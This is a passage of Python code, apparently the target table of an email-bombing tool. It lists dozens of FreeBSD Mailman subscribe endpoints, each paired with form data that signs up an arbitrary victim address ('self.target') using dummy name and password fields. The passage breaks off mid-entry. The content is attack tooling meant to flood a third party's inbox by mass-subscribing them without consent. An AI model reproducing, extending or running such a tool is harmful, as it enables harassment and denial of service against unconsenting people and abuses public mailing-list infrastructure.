                'url': 'https://lists.freebsd.org/mailman/subscribe/dev-commits-src-all',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/dev-commits-src-all',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'SLKiI': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/dev-commits-src-branches',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/dev-commits-src-branches',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'sROYI': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/dev-commits-src-main',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/dev-commits-src-main',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'xHzuN': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/dev-reviews',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/dev-reviews',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'cjUeJ': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/freebsd-acpi',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/freebsd-acpi',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'xdEZK': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/freebsd-advocacy',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/freebsd-advocacy',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'oOKah': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/freebsd-amd64',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/freebsd-amd64',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'rQkLi': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/freebsd-announce',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/freebsd-announce',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'raieY': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/freebsd-apache',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/freebsd-apache',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'WgSuW': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/freebsd-arch',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/freebsd-arch',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'lxYLa': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/freebsd-arm',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/freebsd-arm',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'AkLWi': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/freebsd-atm',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/freebsd-atm',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'kmHmX': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/freebsd-bluetooth',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/freebsd-bluetooth',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'PwOVw': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/freebsd-bugbusters',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/freebsd-bugbusters',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'UYMjG': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/freebsd-bugs',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/freebsd-bugs',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'TDtNE': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/freebsd-chat',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/freebsd-chat',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'APmUL': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/freebsd-chromium',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/freebsd-chromium',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'vDYmA': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/freebsd-cloud',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/freebsd-cloud',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'cCGeJ': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/freebsd-cluster',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/freebsd-cluster',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'FqKVT': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/freebsd-course',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/freebsd-course',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'VwDrT': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/freebsd-current',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/freebsd-current',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'DyjZX': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/freebsd-database',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/freebsd-database',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'zDEQN': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/freebsd-desktop',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/freebsd-desktop',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'BZavf': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/freebsd-doc',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/freebsd-doc',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'RBaxY': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/freebsd-drivers',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/freebsd-drivers',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'iTLXk': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/freebsd-dtrace',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/freebsd-dtrace',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'lPRRM': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/freebsd-eclipse',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/freebsd-eclipse',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'OZCxP': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/freebsd-elastic',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/freebsd-elastic',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'bfgbF': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/freebsd-embedded',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/freebsd-embedded',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'dxtpg': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/freebsd-emulation',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/freebsd-emulation',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'qhWHL': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/freebsd-enlightenment',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/freebsd-enlightenment',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'ELSHb': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/freebsd-eol',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/freebsd-eol',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'crdCc': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/freebsd-erlang',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/freebsd-erlang',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'uhCkq': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/freebsd-fcp',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/freebsd-fcp',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'gIemg': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/freebsd-fcp-editors',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/freebsd-fcp-editors',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'nEICO': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/freebsd-firewire',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/freebsd-firewire',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'JMrhe': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/freebsd-fortran',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/freebsd-fortran',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'oGsLk': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/freebsd-fs',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/freebsd-fs',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'epjAY': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/freebsd-games',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/freebsd-games',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'eDOXB': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/freebsd-gecko',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/freebsd-gecko',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'vdtDM': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/freebsd-geom',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/freebsd-geom',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'wuuDT': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/freebsd-git',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/freebsd-git',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'IqgVH': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/freebsd-gnome',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/freebsd-gnome',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'eJntn': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/freebsd-hackers',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/freebsd-hackers',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'ZsiwP': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/freebsd-hardware',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/freebsd-hardware',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'tkMAp': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/freebsd-haskell',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/freebsd-haskell',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'tGSbT': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/freebsd-hpc',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/freebsd-hpc',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'IGLUL': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/freebsd-hubs',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/freebsd-hubs',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'gfUPu': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/freebsd-i18n',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/freebsd-i18n',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'CDFsn': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/freebsd-i386',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/freebsd-i386',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'iYrRx': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/freebsd-infiniband',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/freebsd-infiniband',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'ycCKX': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/freebsd-ipfw',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/freebsd-ipfw',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'VAVJa': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/freebsd-isdn',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/freebsd-isdn',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'xqHKY': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/freebsd-isp',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/freebsd-isp',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'YrtvH': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/freebsd-jail',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/freebsd-jail',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'nwooD': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/freebsd-java',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/freebsd-java',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'Wgsii': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/freebsd-jobs',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/freebsd-jobs',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'hwSHf': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/freebsd-lfs',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/freebsd-lfs',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'neJOM': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/freebsd-mips',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/freebsd-mips',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'syfFO': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/freebsd-mono',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/freebsd-mono',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'aeIEY': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/freebsd-multimedia',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/freebsd-multimedia',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'MxciX': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/freebsd-net',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/freebsd-net',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'VSlDT': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/freebsd-new-bus',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/freebsd-new-bus',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'PJBvJ': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/freebsd-numerics',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/freebsd-numerics',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'CkntE': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/freebsd-ocaml',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/freebsd-ocaml',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'cSdoo': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/freebsd-office',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/freebsd-office',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'vkqsW': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/freebsd-openoffice',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/freebsd-openoffice',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'QnzuS': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/freebsd-ops-announce',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/freebsd-ops-announce',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'okqmO': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/freebsd-performance',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/freebsd-performance',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'LPeiC': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/freebsd-perl',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/freebsd-perl',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'udVaK': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/freebsd-pf',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/freebsd-pf',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'iQIYL': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/freebsd-pkg',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/freebsd-pkg',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'wiSsh': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/freebsd-pkg-fallout',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/freebsd-pkg-fallout',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'ozuHq': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/freebsd-pkgbase',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/freebsd-pkgbase',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'lMGpv': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/freebsd-platforms',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/freebsd-platforms',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'clDSg': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/freebsd-policy',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/freebsd-policy',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'DMEeI': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/freebsd-ports',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/freebsd-ports',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'ghPxt': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/freebsd-ports-announce',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/freebsd-ports-announce',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'SJFGJ': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/freebsd-ports-bugs',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/freebsd-ports-bugs',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'UKzyi': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/freebsd-ppc',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/freebsd-ppc',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'VohKj': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/freebsd-proliant',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/freebsd-proliant',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'bLsFb': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/freebsd-python',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/freebsd-python',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'pYzlH': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/freebsd-quarterly-calls',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/freebsd-quarterly-calls',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'XeftM': {
                'url': 'https://lists.freebsd.org/mailman/subscribe/freebsd-questions',
                'token_url': 'https://lists.freebsd.org/mailman/listinfo/freebsd-questions',
